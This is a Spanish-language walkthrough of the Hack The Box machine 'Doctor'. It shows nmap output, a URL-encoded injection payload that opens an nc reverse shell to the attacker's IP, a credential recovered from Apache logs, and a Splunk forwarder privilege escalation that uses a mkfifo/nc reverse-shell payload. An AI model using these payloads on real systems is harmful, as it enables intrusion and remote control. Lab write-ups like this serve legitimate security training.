@@ -1,0 +1,186 @@
+---
+title: Doctor HTB
+author: OxDeed
+date: 2020-11-10 15:29:00 -0300
+tags: [splunk,ssti,easy,hackthebox]
+math: true
+image: /htb/doctor/doctor.png
+---
+
+## Resumen
+
+Empezamos con Doctor analizando el puerto `80 http` donde nos encontraremos con un posible nombre de dominio `doctors.htb`. 
+
+Una vez agregado al file `/etc/hosts/` La pagina nos mostrara un sistema de posts-mensajeria el cual es vulnerable a ataques de tipo server-side-template-injection `(SSTI)`. Con esto seremos capaces de obtener la primera reverse shell. 
+
+Aún debemos escalar de usuario, y solo bastara con ejecutar un `linepeash.sh` y encontraremos el pass de shaun en los logs de apache.
+
+Como ultimo paso 
+nos quedaria la escalacion de privilegios hacia root, donde nos aprovecharemos de la vulnerabilidad del `splunkforwarder` que esta corriendo en el `puerto 8089` con el exploit [**SplunkWhisperer2**](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2) para finalmente obtener el `root.txt`. 
+
+## Pwned
+<link rel="stylesheet" type="text/css" href="/assets/css/asciinema-player.css"/>
+<asciinema-player src="/htb/doctor/2.cast" cols="107" rows="24"></asciinema-player>
+<script type="text/javascript" src="/assets/js/asciinema-player.js"></script>
+
+---
+
+## Reconocimiento
+```console
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 18:06 EST
+Nmap scan report for doctors.htb (10.10.10.209)
+Host is up (0.23s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+| http-server-header: 
+|   Apache/2.4.41 (Ubuntu)
+|_  Werkzeug/1.0.1 Python/3.8.2
+| http-title: Doctor Secure Messaging - Login
+|_Requested resource was http://doctors.htb/login?next=%2F
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.53 seconds
+  ```
+---
+Como podemos ver hay un correo con un posible nombre de dominio `doctors.htb` 
+
+![Desktop View](/htb/doctor/1.png)
+---
+## Nombre de Dominio
+Lo agregamos en nuestro archivo `hosts` para poder acceder.
+```console
+nano /etc/hosts
+  ```
+```console
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.209    doctors.htb
+  ```
+---
+## SSTI
+
+Una vez en doctors.htb nos encontramos con un sistema de posts/mensajeria donde tendremos que `registrarnos` y `logearnos`.
+![Desktop View](/htb/doctor/4.png)
+![Desktop View](/htb/doctor/6.png)
+Creamos un nuevo mensaje `New Message`
+![Desktop View](/htb/doctor/7.png)
+
+---
+
+La web esta usando `flask` la cual puede ser vulnerable a server-side-template-injection [**SSTI Payloads**](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34)
+
+![Desktop View](/htb/doctor/12.png)
+Capturamos el request con Burp Suite e Inyectamos con el siguiente payload: `title=curl+http%3A%2F%2Fip%2F%24%28nc.traditional%24IFS%252710.10.15.31%2527%24IFS%25274949%2527%24IFS-e%24IFS%2Fbin%2Fsh%29&content=curl http://ip/$(nc.traditional$IFS%2710.10.14.230%27$IFS%274949%27$IFS-e$IFS/bin/sh)dbody&submit=Post`
+
+Una vez dentro, podemos usar nuestra llave pública para logearnos con `ssh`.
+```console
+web@doctor:~/.ssh$ ls
+ls
+authorized_keys
+``` 
+---
+<asciinema-player src="/htb/doctor/1.cast" cols="107" rows="24"></asciinema-player>
+---
+## Privesc Shaun
+
+Subimos el linpeash para enumerar
+```console
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.209 - - [09/Nov/2020 18:48:11] "GET /linpeash.sh HTTP/1.1" 200 -
+``` 
+---
+```console
+web@doctor:~$ wget 10.10.15.31/linpeash.sh
+
+--2020-11-10 00:48:10--  http://10.10.15.31/linpeash.sh
+Connecting to 10.10.15.31:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 294784 (288K) [text/x-sh]
+Saving to: ‘linpeash.sh’
+
+linpeash.sh 100%[==========================================================================================>] 287,88K   208KB/s    in 1,4s    
+
+2020-11-10 00:48:12 (208 KB/s) - ‘linpeash.sh’ saved [294784/294784]
+``` 
+
+```console
+web@doctor:~$ chmod +x linpeash.sh 
+```
+
+En los logs del apache nos encontramos con el password del usuario shaun ` Guitar123` . 
+```console
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+```
+![Desktop View](/htb/doctor/11.png)
+
+```console
+web@doctor:~$ su shaun
+Password: Guitar123
+```
+```console
+shaun@doctor:~$ cat user.txt 
+5eb4d98c4564ab31f0a9e00c8899d522
+```
+---
+
+## Privesc Root
+
+Luego de enumerar un poco podemos darnos cuenta que se esta ejecutando el `splunkforwarder` en este caso, si esta mal configurado podemos escalar privilegios bajo el usuario el cual esta corriendo el forwarder. [**Exploit Splunk Forwarder Explicación**](https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2)
+![Desktop View](/htb/doctor/10.png)
+
+```console
+shaun@doctor:/opt$ ls
+splunkforwarder
+```
+```console
+tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+```
+
+### Exploiting Splunk Forwarder
+
+Ahora que tenemos información de como podemos explotar el splunk forwarder, nos queda descargarnos la herramienta. [**SplunkWhisperer2**](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
+
+Abrimos 2 Shells en la primera: 
+```console
+kali@kali: python PySplunkWhisperer2_remote.py --lhost 10.10.15.31 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/deed;mkfifo /tmp/deed;cat /tmp/deed|/bin/sh -i 2>&1|nc 10.10.15.31 3748 >/tmp/deed"'
+```
+En la Segunda nos ponemos a la escucha:
+```console
+nc -lvnp 3748
+listening on [any] 3748 ...
+connect to [10.10.15.31] from (UNKNOWN) [10.10.10.209] 54452
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+---
+
+<asciinema-player src="/htb/doctor/2.cast" cols="107" rows="24"></asciinema-player>
+
+---
+![Desktop View](/htb/doctor/pwned.gif)
+
+---
+
+## Recursos 
+
+| Topics                       | 
+|:-----------------------------|
+| [**SSTI Payloads**](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34) | 
+|[**Exploit Splunk Forwarder**](https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2)     |
+
+---
+
+
+
+
